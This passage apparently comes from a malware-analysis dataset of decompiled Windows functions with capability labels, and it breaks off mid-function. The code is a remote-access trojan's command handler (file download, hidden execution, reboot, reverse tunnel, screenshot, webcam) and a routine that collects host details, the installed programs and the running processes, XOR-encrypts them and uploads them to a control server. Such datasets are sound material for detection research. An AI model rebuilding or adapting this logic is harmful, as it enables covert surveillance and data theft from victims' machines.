1;\n                } while (cVar2 != '\\0');\n                arg_14h = fcn.0041ff97();\n                pcVar7 = acStack800;\n                do {\n                    cVar2 = *pcVar7;\n                    pcVar7 = pcVar7 + 1;\n                } while (cVar2 != '\\0');\n                uVar13 = fcn.0041ff97();\n                fcn.00423615(acStack800, 0, 0, arg_14h, uVar13);\n                if (*0x444a85 == '\\0') {\n                    fcn.004060f0();\n                    *0x444a85 = '\\x01';\n                }\n                uVar13 = *(*0x444b3c + 0x94);\n                fcn.00405f40();\n                fcn.00420bd5(uVar9, \"%s?comp=%s&ext=%s.%s\", uVar13);\n                fcn.00420c59(arg_14h);\n                fcn.00420c59();\n                iVar6 = fcn.00404910(uVar9);\n                pcVar4 = _sym.imp.KERNEL32.DLL_Sleep;\n                while (iVar6 == 0) {\n                    (*pcVar4)();\n                    iVar6 = fcn.00404910(uVar9);\n                }\n                fcn.00420c59();\n                fcn.00420c59();\n                puVar12 = fcn.0041ff97();\n                *puVar12 = str.FILE_UPLOADED._0_4_;\n                puVar12[1] = str.FILE_UPLOADED._4_4_;\n                puVar12[2] = str.FILE_UPLOADED._8_4_;\n                *(puVar12 + 3) = str.FILE_UPLOADED._12_2_;\n            }\n            goto code_r0x0040c30e;\n        }\n        pcVar7 = \"download\";\n        puVar5 = auStack544;\n        do {\n            uVar1 = *puVar5;\n            bVar18 = uVar1 < *pcVar7;\n            if (uVar1 != *pcVar7) {\ncode_r0x0040bc48:\n                iVar6 = (1 - bVar18) - (bVar18 != 0);\n                goto code_r0x0040bc4d;\n            }\n            if (uVar1 == 0) break;\n            uVar1 = puVar5[1];\n            bVar18 = uVar1 < pcVar7[1];\n            if (uVar1 != pcVar7[1]) goto code_r0x0040bc48;\n            puVar5 = puVar5 + 2;\n            pcVar7 = pcVar7 + 2;\n        } while (uVar1 != 0);\n        iVar6 = 0;\ncode_r0x0040bc4d:\n        if (iVar6 == 0) {\n            puVar12 = fcn.0041ff97();\n            fcn.00405130(arg_8h, 0x22, 0x22, auStack1104, 0x100);\n            fcn.00405130(arg_8h, 0x22, 0x22, acStack800, 0x100);\n            fcn.00405130(arg_8h, 0x22, 0x22, auStack288, 0x100);\n            iVar6 = fcn.00404510(acStack800);\n            if (iVar6 == 0) {\n                *puVar12 = str.DOWNLOAD_FAILED._0_4_;\n                puVar12[1] = str.DOWNLOAD_FAILED._4_4_;\n                puVar12[2] = str.DOWNLOAD_FAILED._8_4_;\n                puVar12[3] = str.DOWNLOAD_FAILED._12_4_;\n            }\n            else {\n                *puVar12 = str.FILE_DOWNLOADED._0_4_;\n                puVar12[1] = str.FILE_DOWNLOADED._4_4_;\n                puVar12[2] = str.FILE_DOWNLOADED._8_4_;\n                puVar12[3] = str.FILE_DOWNLOADED._12_4_;\n            }\n            goto code_r0x0040c30e;\n        }\n        puVar5 = auStack544;\n        pcVar7 = \"exec_show\";\n        do {\n            uVar1 = *puVar5;\n            bVar18 = uVar1 < *pcVar7;\n            if (uVar1 != *pcVar7) {\ncode_r0x0040bd50:\n                iVar6 = (1 - bVar18) - (bVar18 != 0);\n                goto code_r0x0040bd55;\n            }\n            if (uVar1 == 0) break;\n            uVar1 = puVar5[1];\n            bVar18 = uVar1 < pcVar7[1];\n            if (uVar1 != pcVar7[1]) goto code_r0x0040bd50;\n            puVar5 = puVar5 + 2;\n            pcVar7 = pcVar7 + 2;\n        } while (uVar1 != 0);\n        iVar6 = 0;\ncode_r0x0040bd55:\n        if (iVar6 == 0) {\n            puVar12 = fcn.0041ff97();\n            fcn.00405130(arg_8h, 0x22, 0x22, auStack288, 0x100);\n            fcn.00405130(arg_8h, 0x22, 0x22, auStack1104, 0x100);\n            iVar6 = (*_sym.imp.SHELL32.dll_ShellExecuteA)(0);\n            if (iVar6 == 2) {\n                *puVar12 = str.FILE_NOT_FOUND._0_4_;\n                puVar12[1] = str.FILE_NOT_FOUND._4_4_;\n                puVar12[2] = str.FILE_NOT_FOUND._8_4_;\n                *(puVar12 + 3) = str.FILE_NOT_FOUND._12_2_;\n                *(puVar12 + 0xe) = str.FILE_NOT_FOUND[14];\n            }\n            else {\n                *puVar12 = *0x43e220;\n                *(puVar12 + 2) = *0x43e222;\n            }\n            goto code_r0x0040c30e;\n        }\n        pcVar7 = \"exec_hide\";\n        puVar5 = auStack544;\n        do {\n            uVar1 = *puVar5;\n            bVar18 = uVar1 < *pcVar7;\n            if (uVar1 != *pcVar7) {\ncode_r0x0040be40:\n                iVar6 = (1 - bVar18) - (bVar18 != 0);\n                goto code_r0x0040be45;\n            }\n            if (uVar1 == 0) break;\n            uVar1 = puVar5[1];\n            bVar18 = uVar1 < pcVar7[1];\n            if (uVar1 != pcVar7[1]) goto code_r0x0040be40;\n            puVar5 = puVar5 + 2;\n            pcVar7 = pcVar7 + 2;\n        } while (uVar1 != 0);\n        iVar6 = 0;\ncode_r0x0040be45:\n        if (iVar6 == 0) {\n            puVar12 = fcn.0041ff97();\n            fcn.00405130(arg_8h, 0x22, 0x22, auStack288, 0x100);\n            fcn.00405130(arg_8h, 0x22, 0x22, auStack1104, 0x100);\n            iVar6 = (*_sym.imp.SHELL32.dll_ShellExecuteA)(0);\n            if (iVar6 == 2) {\n                *puVar12 = str.FILE_NOT_FOUND._0_4_;\n                puVar12[1] = str.FILE_NOT_FOUND._4_4_;\n                puVar12[2] = str.FILE_NOT_FOUND._8_4_;\n                *(puVar12 + 3) = str.FILE_NOT_FOUND._12_2_;\n                *(puVar12 + 0xe) = str.FILE_NOT_FOUND[14];\n            }\n            else {\n                *puVar12 = *0x43e220;\n                *(puVar12 + 2) = *0x43e222;\n            }\n            goto code_r0x0040c30e;\n        }\n        pcVar7 = \"reboot\";\n        puVar5 = auStack544;\n        do {\n            uVar1 = *puVar5;\n            bVar18 = uVar1 < *pcVar7;\n            if (uVar1 != *pcVar7) {\ncode_r0x0040bf30:\n                iVar6 = (1 - bVar18) - (bVar18 != 0);\n                goto code_r0x0040bf35;\n            }\n            if (uVar1 == 0) break;\n            uVar1 = puVar5[1];\n            bVar18 = uVar1 < pcVar7[1];\n            if (uVar1 != pcVar7[1]) goto code_r0x0040bf30;\n            puVar5 = puVar5 + 2;\n            pcVar7 = pcVar7 + 2;\n        } while (uVar1 != 0);\n        iVar6 = 0;\ncode_r0x0040bf35:\n        if (iVar6 == 0) {\n            (*_sym.imp.SHELL32.dll_ShellExecuteA)(0);\n            puVar14 = fcn.0041ff97();\n            puVar12 = \"SYSTEM GOING FOR REBOOT NOW\";\n            for (iVar6 = 7; iVar6 != 0; iVar6 = iVar6 + -1) {\n                *puVar14 = *puVar12;\n                puVar12 = puVar12 + 1;\n                puVar14 = puVar14 + 1;\n            }\n            goto code_r0x0040c30e;\n        }\n        pcVar7 = \"msgbox\";\n        puVar5 = auStack544;\n        do {\n            uVar1 = *puVar5;\n            bVar18 = uVar1 < *pcVar7;\n            if (uVar1 != *pcVar7) {\ncode_r0x0040bfa0:\n                iVar6 = (1 - bVar18) - (bVar18 != 0);\n                goto code_r0x0040bfa5;\n            }\n            if (uVar1 == 0) break;\n            uVar1 = puVar5[1];\n            bVar18 = uVar1 < pcVar7[1];\n            if (uVar1 != pcVar7[1]) goto code_r0x0040bfa0;\n            puVar5 = puVar5 + 2;\n            pcVar7 = pcVar7 + 2;\n        } while (uVar1 != 0);\n        iVar6 = 0;\ncode_r0x0040bfa5:\n        if (iVar6 == 0) {\n            fcn.00405130(arg_8h, 0x22, 0x22, auStack288, 0x100);\n            fcn.00405130(arg_8h, 0x22, 0x22, auStack1104, 0x100);\n            (*_sym.imp.USER32.dll_MessageBoxA)();\n            puVar12 = fcn.0041ff97();\n            *puVar12 = str.MESSAGEBOX_DISPLAYED._0_4_;\n            puVar12[1] = str.MESSAGEBOX_DISPLAYED._4_4_;\n            puVar12[2] = str.MESSAGEBOX_DISPLAYED._8_4_;\n            puVar12[3] = str.MESSAGEBOX_DISPLAYED._12_4_;\n            puVar12[4] = str.MESSAGEBOX_DISPLAYED._16_4_;\n            *(puVar12 + 5) = str.MESSAGEBOX_DISPLAYED[20];\n            goto code_r0x0040c30e;\n        }\n        pcVar7 = \"backconnect\";\n        puVar5 = auStack544;\n        do {\n            uVar1 = *puVar5;\n            bVar18 = uVar1 < *pcVar7;\n            if (uVar1 != *pcVar7) {\ncode_r0x0040c065:\n                iVar6 = (1 - bVar18) - (bVar18 != 0);\n                goto code_r0x0040c06a;\n            }\n            if (uVar1 == 0) break;\n            uVar1 = puVar5[1];\n            bVar18 = uVar1 < pcVar7[1];\n            if (uVar1 != pcVar7[1]) goto code_r0x0040c065;\n            puVar5 = puVar5 + 2;\n            pcVar7 = pcVar7 + 2;\n        } while (uVar1 != 0);\n        iVar6 = 0;\ncode_r0x0040c06a:\n        if (iVar6 == 0) {\n            uVar9 = fcn.0041ff97();\n            fcn.00405130(arg_8h, 0x22, 0x22, uVar9, 0x100);\n            fcn.00405130(arg_8h, 0x22, 0x22, &pcStack808, 8);\n            *0x444a78 = uVar9;\n            *0x444a90 = fcn.00423677();\n            (*_sym.imp.KERNEL32.DLL_CreateThread)(0);\n            puVar12 = fcn.0041ff97();\n            *puVar12 = str.TUNNEL_THREAD_CALLED._0_4_;\n            puVar12[1] = str.TUNNEL_THREAD_CALLED._4_4_;\n            puVar12[2] = str.TUNNEL_THREAD_CALLED._8_4_;\n            puVar12[3] = str.TUNNEL_THREAD_CALLED._12_4_;\n            puVar12[4] = str.TUNNEL_THREAD_CALLED._16_4_;\n            *(puVar12 + 5) = str.TUNNEL_THREAD_CALLED[20];\n            goto code_r0x0040c30e;\n        }\n        pcVar7 = \"recorder\";\n        puVar5 = auStack544;\n        do {\n            uVar1 = *puVar5;\n            bVar18 = uVar1 < *pcVar7;\n            if (uVar1 != *pcVar7) {\ncode_r0x0040c150:\n                iVar6 = (1 - bVar18) - (bVar18 != 0);\n                goto code_r0x0040c155;\n            }\n            if (uVar1 == 0) break;\n            uVar1 = puVar5[1];\n            bVar18 = uVar1 < pcVar7[1];\n            if (uVar1 != pcVar7[1]) goto code_r0x0040c150;\n            puVar5 = puVar5 + 2;\n            pcVar7 = pcVar7 + 2;\n        } while (uVar1 != 0);\n        iVar6 = 0;\ncode_r0x0040c155:\n        if (iVar6 != 0) {\n            pcVar7 = \"screenshot\";\n            puVar5 = auStack544;\n            do {\n                uVar1 = *puVar5;\n                bVar18 = uVar1 < *pcVar7;\n                if (uVar1 != *pcVar7) {\ncode_r0x0040c1c0:\n                    iVar6 = (1 - bVar18) - (bVar18 != 0);\n                    goto code_r0x0040c1c5;\n                }\n                if (uVar1 == 0) break;\n                uVar1 = puVar5[1];\n                bVar18 = uVar1 < pcVar7[1];\n                if (uVar1 != pcVar7[1]) goto code_r0x0040c1c0;\n                puVar5 = puVar5 + 2;\n                pcVar7 = pcVar7 + 2;\n            } while (uVar1 != 0);\n            iVar6 = 0;\ncode_r0x0040c1c5:\n            if (iVar6 != 0) {\n                pcVar7 = \"webcam\";\n                puVar5 = auStack544;\n                do {\n                    uVar1 = *puVar5;\n                    bVar18 = uVar1 < *pcVar7;\n                    if (uVar1 != *pcVar7) {\ncode_r0x0040c203:\n                        iVar6 = (1 - bVar18) - (bVar18 != 0);\n                        goto code_r0x0040c208;\n                    }\n                    if (uVar1 == 0) break;\n                    uVar1 = puVar5[1];\n                    bVar18 = uVar1 < pcVar7[1];\n                    if (uVar1 != pcVar7[1]) goto code_r0x0040c203;\n                    puVar5 = puVar5 + 2;\n                    pcVar7 = pcVar7 + 2;\n                } while (uVar1 != 0);\n                iVar6 = 0;\ncode_r0x0040c208:\n                if (iVar6 != 0) {\n                    fcn.004050a0();\n                    uStack12 = 1;\n                    iVar6 = fcn.004236e0(arg_8h, 0x43c300);\n                    if (iVar6 != 0) {\n                        iVar10 = fcn.00420fbc(iVar6);\n                        while (iVar10 == 0) {\n                            fcn.004220ca(&uStack1105, 1, 1, iVar6);\n                            fcn.004050e0(&uStack1105);\n                            iVar10 = fcn.00420fbc(iVar6);\n                        }\n                        fcn.004226f5(iVar6);\n                    }\n                    pcVar7 = pcStack808;\n                    if (auStack804 < 3) {\n                        puVar5 = auStack544;\n                        do {\n                            uVar1 = *puVar5;\n                            puVar5 = puVar5 + 1;\n                        } while (uVar1 != 0);\n                        uVar9 = fcn.0041ff97();\n                        fcn.00420bd5(uVar9, \"UNKNOWN COMMAND - \\\"%s\\\"\", auStack544);\n                    }\n                    else {\n                        iVar6 = fcn.0041ff97();\n                        pcVar8 = pcVar7;\n                        do {\n                            cVar2 = *pcVar8;\n                            pcVar8[iVar6 - pcVar7] = cVar2;\n                            pcVar8 = pcVar8 + 1;\n                        } while (cVar2 != '\\0');\n                    }\n                    goto code_r0x0040c304;\n                }\n            }\n        }\n        (*_sym.imp.KERNEL32.DLL_CreateThread)(0);\n        puVar17 = fcn.0041ff97();\n        *puVar17 = *0x43e220;\n        *(puVar17 + 1) = *0x43e222;\n    }\ncode_r0x0040c30e:\n    *in_FS_OFFSET = piStack20;\n    fcn.00420bc6(in_stack_fffffb9c);\n    return;\n}\n",
        "token_count": 6632
    },
    "0040c340": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040c340(void)\n\n{\n    char *pcVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint uVar4;\n    char *arg_8h;\n    char *pcVar5;\n    int32_t iVar6;\n    char *pcVar7;\n    int32_t iVar8;\n    char *pcVar9;\n    uint uVar10;\n    int32_t iVar11;\n    int32_t iStack16;\n    int32_t iStack12;\n    \n    uVar4 = fcn.00420e6f(0);\n    fcn.00420c64(uVar4);\ncode_r0x0040c360:\n    arg_8h = fcn.0040c4f0();\n    if (arg_8h != NULL) {\n        pcVar5 = arg_8h;\n        do {\n            cVar2 = *pcVar5;\n            pcVar5 = pcVar5 + 1;\n        } while (cVar2 != '\\0');\n        iVar6 = pcVar5 - (arg_8h + 1);\n        iStack12 = iVar6;\n        if (*0x444a85 == '\\0') {\n            fcn.004060f0();\n            *0x444a85 = '\\x01';\n        }\n        pcVar7 = *(*0x444b3c + 8);\n        pcVar5 = pcVar7 + 1;\n        do {\n            cVar2 = *pcVar7;\n            pcVar7 = pcVar7 + 1;\n        } while (cVar2 != '\\0');\n        iStack16 = pcVar7 - pcVar5;\n        if (*0x444a85 == '\\0') {\n            fcn.004060f0();\n            *0x444a85 = '\\x01';\n        }\n        iVar3 = *(*0x444b3c + 8);\n        iVar8 = 0;\n        iVar11 = 0;\n        if (0 < iVar6) {\n            do {\n                if (iStack16 <= iVar11) {\n                    iVar11 = 0;\n                }\n                arg_8h[iVar8] = arg_8h[iVar8] ^ -*(iVar11 + iVar3);\n                iVar8 = iVar8 + 1;\n                iVar11 = iVar11 + 1;\n            } while (iVar8 < iStack12);\n        }\n        if (*0x444a85 == '\\0') {\n            fcn.004060f0();\n            *0x444a85 = '\\x01';\n        }\n        pcVar7 = *(*0x444b3c + 0x94);\n        pcVar5 = pcVar7 + 1;\n        do {\n            cVar2 = *pcVar7;\n            pcVar7 = pcVar7 + 1;\n        } while (cVar2 != '\\0');\n        pcVar9 = fcn.00405f40();\n        pcVar1 = pcVar9 + 1;\n        do {\n            cVar2 = *pcVar9;\n            pcVar9 = pcVar9 + 1;\n        } while (cVar2 != '\\0');\n        uVar4 = fcn.0041ff97(pcVar7 + pcVar9 + ((0x80 - pcVar1) - pcVar5));\n        if (*0x444a85 == '\\0') {\n            fcn.004060f0();\n            *0x444a85 = '\\x01';\n        }\n        uVar10 = *(*0x444b3c + 0x94);\n        fcn.00405f40();\n        fcn.00420bd5(uVar4, \"%s?enc&comp=%s&ext=sysinfo.txt\", uVar10);\n        uVar10 = fcn.004015f0();\n        do {\n            iStack16 = 0;\n            iVar6 = (*_sym.imp.WININET.dll_InternetGetConnectedState)(&iStack16, 0);\n            if (iVar6 != 0) {\n                iVar6 = fcn.004046c0(arg_8h, iStack12, &iStack16);\n                if (iVar6 != 0) goto code_r0x0040c4c1;\n            }\n            (*_sym.imp.KERNEL32.DLL_Sleep)(30000);\n        } while( true );\n    }\n    goto code_r0x0040c4dc;\ncode_r0x0040c4c1:\n    fcn.00420c59(uVar10);\n    fcn.00420c59(uVar4);\n    fcn.00420c59(arg_8h);\ncode_r0x0040c4dc:\n    (*_sym.imp.KERNEL32.DLL_Sleep)(300000);\n    goto code_r0x0040c360;\n}\n",
        "token_count": 1034
    },
    "0040c4f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040c4f0(void)\n\n{\n    char *pcVar1;\n    char *pcVar2;\n    char cVar3;\n    uint8_t uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint uVar7;\n    uchar *arg_8h;\n    uchar *puVar8;\n    char *pcVar9;\n    char *pcVar10;\n    uint *puVar11;\n    char *pcVar12;\n    char *pcVar13;\n    char *pcVar14;\n    char *pcVar15;\n    uint uVar16;\n    int32_t iVar17;\n    int32_t iVar18;\n    uint8_t *puVar19;\n    int32_t iVar20;\n    int32_t *in_FS_OFFSET;\n    bool bVar21;\n    float10 fVar22;\n    uint *arg_8h_00;\n    int32_t var_3f0h;\n    uint var_3ech;\n    uint var_3e8h;\n    uint var_3e4h;\n    uint var_3e0h;\n    uint var_3bch;\n    uint var_2b8h;\n    uint var_294h;\n    uint lpBuffer;\n    uint var_188h;\n    uint lpSystemTime;\n    uint var_168h;\n    uint var_160h;\n    uint16_t var_15ah;\n    uint var_158h;\n    uint var_154h;\n    uint var_150h;\n    uint var_50h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x437f2b;\n    var_ch = *in_FS_OFFSET;\n    uVar6 = *0x441480 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_10h = uVar6;\n    uVar7 = fcn.00422819(1);\n    var_4h = 0;\n    arg_8h = fcn.004228ad(uVar7, 0x22);\n    iVar20 = 0x21;\n    puVar8 = arg_8h;\n    do {\n        *puVar8 = puVar8[\"############ CLIENT ############\\n\" - arg_8h];\n        puVar8 = puVar8 + 1;\n        iVar20 = iVar20 + -1;\n    } while (iVar20 != 0);\n    arg_8h[0x21] = 0;\n    fcn.00405270(uVar6);\n    arg_8h_00 = &lpBuffer;\n    (*_sym.imp.KERNEL32.DLL_GlobalMemoryStatus)();\n    uVar7 = fcn.004053d0();\n    pcVar9 = fcn.00420d1e(\"USERNAME\");\n    pcVar14 = pcVar9 + 1;\n    do {\n        cVar3 = *pcVar9;\n        pcVar9 = pcVar9 + 1;\n    } while (cVar3 != '\\0');\n    pcVar10 = fcn.00420d1e(\"USERDOMAIN\");\n    pcVar15 = pcVar10 + 1;\n    do {\n        cVar3 = *pcVar10;\n        pcVar10 = pcVar10 + 1;\n    } while (cVar3 != '\\0');\n    puVar11 = &var_150h;\n    do {\n        cVar3 = *puVar11;\n        puVar11 = puVar11 + 1;\n    } while (cVar3 != '\\0');\n    pcVar12 = fcn.00420d1e(\"NUMBER_OF_PROCESSORS\");\n    pcVar1 = pcVar12 + 1;\n    do {\n        cVar3 = *pcVar12;\n        pcVar12 = pcVar12 + 1;\n    } while (cVar3 != '\\0');\n    pcVar13 = fcn.00420d1e(\"PROCESSOR_ARCHITECTURE\");\n    pcVar2 = pcVar13 + 1;\n    do {\n        cVar3 = *pcVar13;\n        pcVar13 = pcVar13 + 1;\n    } while (cVar3 != '\\0');\n    pcVar14 = fcn.0041ff97(pcVar9 + pcVar10 + puVar11 + pcVar12 + pcVar13 + (((((-pcVar2 - pcVar1) - (&var_150h + 1)) -\n                                                                              pcVar15) + 0x80) - pcVar14));\n    if (*0x444a85 == '\\0') {\n        fcn.004060f0();\n        *0x444a85 = '\\x01';\n    }\n    uVar16 = **0x444b3c;\n    fcn.00420d1e(\"PROCESSOR_ARCHITECTURE\");\n    fcn.00420d1e(\"NUMBER_OF_PROCESSORS\");\n    fcn.00420d1e(\"USERDOMAIN\");\n    fcn.00420d1e(\"USERNAME\");\n    fVar22 = fcn.00422fdf(uVar16);\n    fcn.00420bd5(pcVar14, \"Version: %.1f\\n%s@%s\\nOS:\\t%s\\nCPU:\\t%s %s processor(s)\\nRAM:\\t%i MB\\nMAC:\\t%s\", \n                 SUB84(fVar22, 0));\n    pcVar9 = pcVar14 + 1;\n    pcVar15 = pcVar14;\n    do {\n        cVar3 = *pcVar15;\n        pcVar15 = pcVar15 + 1;\n    } while (cVar3 != '\\0');\n    pcVar10 = pcVar15 + (0x21 - pcVar9);\n    iVar20 = fcn.004228ad(arg_8h, pcVar15 + (0x22 - pcVar9));\n    iVar18 = 0x21;\n    if (0x21 < pcVar10) {\n        do {\n            *(iVar18 + iVar20) = pcVar14[iVar18 + -0x21];\n            iVar18 = iVar18 + 1;\n        } while (iVar18 < pcVar10);\n    }\n    pcVar10[iVar20] = '\\0';\n    iVar20 = fcn.004228ad(iVar20, pcVar15 + (0x24 - pcVar9));\n    pcVar14 = pcVar15 + (0x23 - pcVar9);\n    if (pcVar10 < pcVar14) {\n        iVar18 = 0x43e370 - pcVar10;\n        do {\n            pcVar10[iVar20] = pcVar10[iVar18];\n            pcVar10 = pcVar10 + 1;\n        } while (pcVar10 < pcVar14);\n    }\n    pcVar14[iVar20] = '\\0';\n    fcn.00420c59(uVar7);\n    iVar20 = fcn.004228ad(iVar20, pcVar15 + (0x45 - pcVar9));\n    pcVar15 = pcVar15 + (0x44 - pcVar9);\n    if (pcVar14 < pcVar15) {\n        pcVar9 = pcVar14;\n        do {\n            pcVar9[iVar20] = \"############# TIME #############\\n\"[pcVar9 - pcVar14];\n            pcVar9 = pcVar9 + 1;\n        } while (pcVar9 < pcVar15);\n    }\n    pcVar15[iVar20] = '\\0';\n    (*_sym.imp.KERNEL32.DLL_GetSystemTime)(&lpSystemTime);\n    (*_sym.imp.KERNEL32.DLL_GetLocalTime)(&var_160h);\n    fcn.00420bd5(&var_50h, \"Time zone: GMT %c%i\\n\", (var_158h - var_168h < 0) * 2 + 0x2b);\n    puVar11 = &var_50h;\n    do {\n        cVar3 = *puVar11;\n        puVar11 = puVar11 + 1;\n    } while (cVar3 != '\\0');\n    pcVar14 = puVar11 + (pcVar15 - (&var_50h + 1));\n    iVar20 = fcn.004228ad(iVar20, pcVar14 + 1);\n    if (pcVar15 < pcVar14) {\n        iVar17 = pcVar15 - (&var_50h + 1);\n        iVar18 = -pcVar15;\n        do {\n            pcVar15[iVar20] = *(&var_50h + pcVar15 + iVar18);\n            pcVar15 = pcVar15 + 1;\n        } while (pcVar15 < puVar11 + iVar17);\n    }\n    pcVar14[iVar20] = '\\0';\n    fcn.00420bd5(&var_50h, \"Local time: %i.%i.%i %i:%i:%i\\n\", var_15ah);\n    puVar11 = &var_50h;\n    do {\n        cVar3 = *puVar11;\n        puVar11 = puVar11 + 1;\n    } while (cVar3 != '\\0');\n    pcVar9 = puVar11 + (pcVar14 - (&var_50h + 1));\n    iVar20 = fcn.004228ad(iVar20, pcVar9 + 1);\n    if (pcVar14 < pcVar9) {\n        iVar17 = pcVar14 - (&var_50h + 1);\n        iVar18 = -pcVar14;\n        do {\n            pcVar14[iVar20] = *(&var_50h + pcVar14 + iVar18);\n            pcVar14 = pcVar14 + 1;\n        } while (pcVar14 < puVar11 + iVar17);\n    }\n    pcVar9[iVar20] = '\\0';\n    uVar6 = (*_sym.imp.KERNEL32.DLL_GetTickCount)();\n    fcn.00420bd5(&var_50h, \"Uptime: %i min\\n\", (uVar6 / 1000) / 0x3c);\n    puVar11 = &var_50h;\n    do {\n        cVar3 = *puVar11;\n        puVar11 = puVar11 + 1;\n    } while (cVar3 != '\\0');\n    pcVar14 = puVar11 + (pcVar9 - (&var_50h + 1));\n    iVar20 = fcn.004228ad(iVar20, pcVar14 + 1);\n    if (pcVar9 < pcVar14) {\n        iVar17 = pcVar9 - (&var_50h + 1);\n        iVar18 = -pcVar9;\n        do {\n            pcVar9[iVar20] = *(&var_50h + pcVar9 + iVar18);\n            pcVar9 = pcVar9 + 1;\n        } while (pcVar9 < puVar11 + iVar17);\n    }\n    pcVar14[iVar20] = '\\0';\n    iVar20 = fcn.004228ad(iVar20, pcVar14 + 3);\n    pcVar9 = pcVar14 + 2;\n    if (pcVar14 < pcVar9) {\n        pcVar15 = pcVar14;\n        do {\n            pcVar15[iVar20] = pcVar15[0x43e370 - pcVar14];\n            pcVar15 = pcVar15 + 1;\n        } while (pcVar15 < pcVar9);\n    }\n    pcVar9[iVar20] = '\\0';\n    var_3f0h = fcn.004228ad(iVar20, pcVar14 + 0x25);\n    pcVar14 = pcVar14 + 0x24;\n    if (pcVar9 < pcVar14) {\n        pcVar15 = pcVar9;\n        do {\n            pcVar15[var_3f0h] = \"######### PROGRAM FILES #########\\n\"[pcVar15 - pcVar9];\n            pcVar15 = pcVar15 + 1;\n        } while (pcVar15 < pcVar14);\n    }\n    pcVar14[var_3f0h] = '\\0';\n    pcVar15 = fcn.00420d1e(\"PROGRAMFILES\");\n    pcVar9 = pcVar15 + 1;\n    do {\n        cVar3 = *pcVar15;\n        pcVar15 = pcVar15 + 1;\n    } while (cVar3 != '\\0');\n    uVar7 = fcn.0041ff97(pcVar15 + (8 - pcVar9));\n    uVar16 = fcn.00420d1e(\"PROGRAMFILES\");\n    fcn.00420bd5(uVar7, \"%s\\\\*.*\", uVar16);\n    iVar20 = fcn.00422c32(uVar7, &var_2b8h);\n    if ((iVar20 != 0) && (iVar20 != -1)) {\n        do {\n            puVar19 = 0x43e13c;\n            puVar11 = &var_294h;\n            do {\n                uVar4 = *puVar11;\n                bVar21 = uVar4 < *puVar19;\n                if (uVar4 != *puVar19) {\ncode_r0x0040ca40:\n                    iVar18 = (1 - bVar21) - (bVar21 != 0);\n                    goto code_r0x0040ca45;\n                }\n                if (uVar4 == 0) break;\n                uVar4 = *(puVar11 + 1);\n                bVar21 = uVar4 < puVar19[1];\n                if (uVar4 != puVar19[1]) goto code_r0x0040ca40;\n                puVar11 = puVar11 + 2;\n                puVar19 = puVar19 + 2;\n            } while (uVar4 != 0);\n            iVar18 = 0;\ncode_r0x0040ca45:\n            if (iVar18 != 0) {\n                puVar19 = 0x43e140;\n                puVar11 = &var_294h;\n                do {\n                    uVar4 = *puVar11;\n                    bVar21 = uVar4 < *puVar19;\n                    if (uVar4 != *puVar19) {\ncode_r0x0040ca78:\n                        iVar18 = (1 - bVar21) - (bVar21 != 0);\n                        goto code_r0x0040ca7d;\n                    }\n                    if (uVar4 == 0) break;\n                    uVar4 = *(puVar11 + 1);\n                    bVar21 = uVar4 < puVar19[1];\n                    if (uVar4 != puVar19[1]) goto code_r0x0040ca78;\n                    puVar11 = puVar11 + 2;\n                    puVar19 = puVar19 + 2;\n                } while (uVar4 != 0);\n                iVar18 = 0;\ncode_r0x0040ca7d:\n                if (iVar18 != 0) {\n                    puVar11 = &var_294h;\n                    do {\n                        cVar3 = *puVar11;\n                        puVar11 = puVar11 + 1;\n                    } while (cVar3 != '\\0');\n                    pcVar9 = puVar11 + (pcVar14 - (&var_294h + 1));\n                    iVar18 = fcn.004228ad(var_3f0h, pcVar9 + 1);\n                    if (pcVar14 < pcVar9) {\n                        iVar5 = pcVar14 - (&var_294h + 1);\n                        iVar17 = -pcVar14;\n                        do {\n                            pcVar14[iVar18] = *(&var_294h + pcVar14 + iVar17);\n                            pcVar14 = pcVar14 + 1;\n                        } while (pcVar14 < puVar11 + iVar5);\n                    }\n                    pcVar9[iVar18] = '\\0';\n                    var_3f0h = fcn.004228ad(iVar18, pcVar9 + 2);\n                    pcVar14 = pcVar9 + 1;\n                    if (pcVar9 < pcVar14) {\n                        iVar18 = 0x43e1ac - pcVar9;\n                        do {\n                            pcVar9[var_3f0h] = pcVar9[iVar18];\n                            pcVar9 = pcVar9 + 1;\n                        } while (pcVar9 < pcVar14);\n                    }\n                    pcVar14[var_3f0h] = '\\0';\n                }\n            }\n            iVar18 = fcn.00422d59(iVar20, &var_2b8h);\n        } while (iVar18 == 0);\n        fcn.00422e87(iVar20);\n    }\n    fcn.00420c59(uVar7);\n    iVar20 = fcn.004228ad(var_3f0h, pcVar14 + 3);\n    pcVar9 = pcVar14 + 2;\n    if (pcVar14 < pcVar9) {\n        pcVar15 = pcVar14;\n        do {\n            pcVar15[iVar20] = pcVar15[0x43e370 - pcVar14];\n            pcVar15 = pcVar15 + 1;\n        } while (pcVar15 < pcVar9);\n    }\n    pcVar9[iVar20] = '\\0';\n    iVar20 = fcn.004228ad(iVar20, pcVar14 + 0x26);\n    pcVar14 = pcVar14 + 0x25;\n    if (pcVar9 < pcVar14) {\n        pcVar15 = pcVar9;\n        do {\n            pcVar15[iVar20] = \"########## PROCESS_LIST ##########\\n\"[pcVar15 - pcVar9];\n            pcVar15 = pcVar15 + 1;\n        } while (pcVar15 < pcVar14);\n    }\n    pcVar14[iVar20] = '\\0';\n    iVar18 = (*_sym.imp.KERNEL32.DLL_CreateToolhelp32Snapshot)(2, 0);\n    if (iVar18 != 0) {\n        var_3e0h = 0x128;\n        iVar17 = (*_sym.imp.KERNEL32.DLL_Process32First)(iVar18, &var_3e0h);\n        while (iVar17 != 0) {\n            puVar11 = &var_3bch;\n            do {\n                cVar3 = *puVar11;\n                puVar11 